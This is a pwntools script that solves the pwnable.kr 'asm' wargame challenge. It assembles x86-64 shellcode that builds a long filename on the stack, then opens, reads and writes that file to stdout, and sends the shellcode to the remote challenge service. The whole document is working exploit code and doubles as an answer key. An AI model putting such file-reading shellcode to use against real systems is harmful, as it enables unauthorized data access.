from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('./asm')

# p = process('./asm')
p = remote('pwnable.kr', '9026')

pause()

# 0x4141402e + len(payload)
payload = asm('''
    /* Save destination */
    mov r8, rdi

    /* push b'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x676e6f306f306f
    xor [rsp], rax
    mov rax, 0x306f306f306f306f
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f3030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f797265765f73
    push rax
    mov rax, 0x695f656d616e5f65
    push rax
    mov rax, 0x6c69665f6568745f
    push rax
    mov rax, 0x7972726f732e656c
    push rax
    mov rax, 0x69665f736968745f
    push rax
    mov rax, 0x646165725f657361
    push rax
    mov rax, 0x656c705f656c6966
    push rax
    mov rax, 0x5f67616c665f726b
    push rax
    mov rax, 0x2e656c62616e7770
    push rax
    mov rax, 0x5f73695f73696874
    push rax

    /* call open('rsp', 'O_RDONLY') */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall

    /* read file */
    sub sp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xfff /* size to read */
    xor rax, rax
    syscall

    /* write to stdout */
    xor rdi, rdi
    add dil, 1 /* set stdout fd = 1 */
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall
''')
print(len(payload))

p.sendlineafter(b'shellcode: ', payload)

p.interactive()